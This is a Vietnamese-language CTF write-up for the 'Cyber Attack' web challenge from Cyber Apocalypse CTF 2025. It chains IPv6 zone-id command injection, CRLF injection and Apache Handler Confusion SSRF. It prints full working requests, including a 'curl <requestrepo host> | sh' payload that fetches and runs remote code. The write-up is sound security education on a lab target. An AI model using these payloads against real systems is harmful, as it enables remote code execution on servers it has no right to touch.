---
layout: default
title: "Cyber Attack"
date: 2025-03-28 21:39:26 +0700
tags: [CTF, Cyber Apocalypse CTF 2025: Tales from Eldoria]
---

# [web] Cyber Attack - web - easy
> Author: tan3ora
- Tên: Cyber Attack
- Description: Welcome, Brave Hero of Eldoria. You’ve entered a domain controlled by the forces of Malakar, the Dark Ruler of Eldoria. This is no place for the faint of heart. Proceed with caution: The systems here are heavily guarded, and one misstep could alert Malakar’s sentinels. But if you’re brave—or foolish—enough to exploit these defenses, you might just find a way to weaken his hold on this world. Choose your path carefully: Your actions here could bring hope to Eldoria… or doom us all. The shadows are watching. Make your move.
- *Có source code*
---
## Phân tích
Web target có 2 chức năng:
1. Attack a Domain trỏ tới `/cgi-bin/attack-domain.py` 
2. Attack an IP trỏ tới `/cgi-bin/attack-ip.py`

### Bypass ip_address() -> OS CmdI
Phân tích source code `attack-domain.py` : 
```python
#!/usr/bin/env python3

import cgi
import os
import re

def is_domain(target):
    return re.match(r'^(?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.[a-zA-Z]{2,63}$', target)

form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')
if not name or not target:
    print('Location: ../?error=Hey, you need to provide a name and a target!')
    
elif is_domain(target):
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {target}') 
    print(f'Location: ../?result=Succesfully attacked {target}!')
else:
    print(f'Location: ../?error=Hey {name}, watch it!')
    
print('Content-Type: text/html')
print()
```
và `attack-ip.py` : 
```python
...
try:
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {ip_address(target)}') 
    print(f'Location: ../?result=Succesfully attacked {target}!')
except:
    print(f'Location: ../?error=Hey {name}, watch it!')
...
```
Ở đây đều có thể khai thác OS command Injection nếu ta kiểm soát được giá trị `target` , tuy nhiên phải bypass qua hàm `ip_address()` hoặc bypass regex :
```python
def is_domain(target):
    return re.match(r'^(?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.[a-zA-Z]{2,63}$', target)
```
Sau khi tìm kiếm thì có thể bypass được qua hàm `ip_address()` dựa vào [đây](https://hackmd.io/@chuongcd/kmactf2024#ipaddress).
Nên để khai thác OS cmdi ta chỉ cần dùng payload `fe80::1%<command>` là được.

Kiểm tra config của Apache:
```
ServerName CyberAttack 

AddType application/x-httpd-php .php

<Location "/cgi-bin/attack-ip"> 
    Order deny,allow
    Deny from all
    Allow from 127.0.0.1
    Allow from ::1
</Location>
```
Ta thấy  `Attack an IP` chỉ chấp nhận được gọi khi dùng IP local -> cần tìm cách để SSRF tới `Attack an IP`,và chắc chắn là từ `Attack a Domain`.

### Handler Confusion -> SSRF
Quay lại phân tích `attack-doamin` ta phát hiện `attack-domain.py` trong `cgi-bin` đã in ra `name` trong thông báo lỗi mà không hề lọc ký tự đặc biệt:
```python
elif is_domain(target):
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {target}') 
    print(f'Location: ../?result=Succesfully attacked {target}!')
else:
    print(f'Location: ../?error=Hey {name}, watch it!')
```
Có thể sử dụng `CRLF Injection` để inject thêm header,mà ta đã biết ở file cấu hình Apache đã cấu hình `AddType application/x-httpd-php .php` thay vì `AddHandler application/x-httpd-php .php` điều này nghĩa là `AddType` chỉ gán giá trị vào `r->content_type`, không gán trực tiếp `handler`.
Do code cũ trong Apache (từ 1996), Apache có đoạn:
```C
if (!r->handler) {
    r->handler = r->content_type;
}
```
Điều này có thể bị lợi dụng để ép Apache dùng `content_type` làm `handler` –> gây ra Handler Confusion.

Để biết thêm chi tiết có thể đọc thêm tại [đây](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/#%F0%9F%94%A5-3-Handler-Confusion). 

Ta có thể khai thác `CRLF Injection` -> `Handler Confusion` -> `SSRF` với payload : 
```
GET /cgi-bin/attack-domain?target=1.1.1.1&name=ttp://%0d%0aLocation:/ooo%0d%0aContent-Type:proxy:<Link_target> HTTP/1.1
Host: 127.0.0.1:1337
Connection: keep-alive
```
## Khai thác
Bypass `ip_address()` và khai thác OScmdi với payload: 
```
target=fe80::1%;curl 1e5qhv69.requestrepo.com | sh&name=hi
```
Ở requestrepo,sử dụng payload để lấy flag:
![](https://)![](http://note.bksec.vn/pad/uploads/c75ebb82-0061-461d-bf6d-08e12d27bcac.png)


Gửi request:
![](https://)![](http://note.bksec.vn/pad/uploads/42308799-a797-4e00-bf6f-e2e52d5a0add.png)
```
GET /cgi-bin/attack-domain?target=1.1.1.1&name=ttp://%0d%0aLocation:/ooo%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip%3Ftarget%3dfe80%253a%253a1%2525%253bcurl%25201e5qhv69.requestrepo.com%2520|%2520sh%26name%3dhi%20%0d%0a%0d%0a HTTP/1.1
Host: 127.0.0.1:1337
Connection: keep-alive
```
Lấy flag:
![](https://)![](http://note.bksec.vn/pad/uploads/5a80d9e5-87fc-45bb-9c60-225573ce158d.png)


